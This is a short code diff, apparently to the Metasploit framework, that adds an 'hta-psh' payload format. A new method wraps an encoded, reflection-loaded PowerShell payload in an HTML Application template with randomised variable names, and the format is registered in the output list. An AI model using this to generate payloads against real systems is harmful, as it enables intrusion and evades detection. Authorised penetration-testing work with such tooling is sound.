@@ -1117,6 +1117,28 @@ require 'msf/core/exe/segment_appender'
                     method: 'reflection')
   end
 
+  def self.to_powershell_hta(framework, arch, code)
+    template_path = File.join(Msf::Config.data_directory,
+                              "templates",
+                              "scripts")
+
+    powershell = Rex::Powershell::Command.cmd_psh_payload(code,
+                    arch,
+                    template_path,
+                    encode_final_payload: true,
+                    remove_comspec: true,
+                    method: 'reflection')
+
+    # Intialize rig and value names
+    rig = Rex::RandomIdentifierGenerator.new()
+    rig.init_var(:var_shell)
+
+    hash_sub = rig.to_h
+    hash_sub[:powershell] = powershell
+
+    read_replace_script_template("to_powershell.hta.template", hash_sub)
+  end
+
   def self.to_win32pe_vbs(framework, code, opts = {})
     to_exe_vbs(to_win32pe(framework, code, opts), opts)
   end
@@ -1924,6 +1946,8 @@ require 'msf/core/exe/segment_appender'
       Msf::Util::EXE.to_win32pe_psh_reflection(framework, code, exeopts)
     when 'psh-cmd'
       Msf::Util::EXE.to_powershell_command(framework, arch, code)
+    when 'hta-psh'
+      Msf::Util::EXE.to_powershell_hta(framework, arch, code)
     end
   end
 
@@ -1939,6 +1963,7 @@ require 'msf/core/exe/segment_appender'
       "exe-only",
       "exe-service",
       "exe-small",
+      "hta-psh",
       "loop-vbs",
       "macho",
       "msi",
